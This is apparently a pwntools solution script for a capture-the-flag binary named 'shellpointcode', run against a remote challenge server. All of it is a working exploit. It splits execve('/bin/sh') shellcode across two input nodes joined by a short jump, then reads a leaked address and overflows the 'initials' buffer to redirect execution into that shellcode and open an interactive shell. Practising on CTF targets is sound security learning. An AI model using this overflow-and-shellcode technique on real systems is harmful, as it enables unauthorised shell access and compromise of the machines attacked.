from pwn import *

context(log_level='debug', os='linux', arch='amd64')

exe = ELF('./shellpointcode')
r = exe.process()
r = remote('node4.buuoj.cn', 28067)
# gdb.attach(r)

# code1 = asm(shellcraft.execve('//bin/sh'))
code1 = asm(
    '''
mov rax, 0x68732f6e69622f2f
xor edx, edx
push rdx
'''
)
code1 += b'\xeb\xd1'

code2 = asm(
    '''
push rax
mov rdi, rsp
xor esi, esi
push 59
pop rax
syscall
'''
)

print(len(code1))
r.recvuntil(b'node 1:  \n')
r.sendline(code1)
r.recvuntil(b'node 2: \n')
r.sendline(code2)

r.recvuntil(b'node.next: ')
code_addr = int(r.recvline(), 16)

r.recvuntil(b'initials?\n')
r.sendline(cyclic(11) + p64(code_addr + 0x28))
r.interactive()
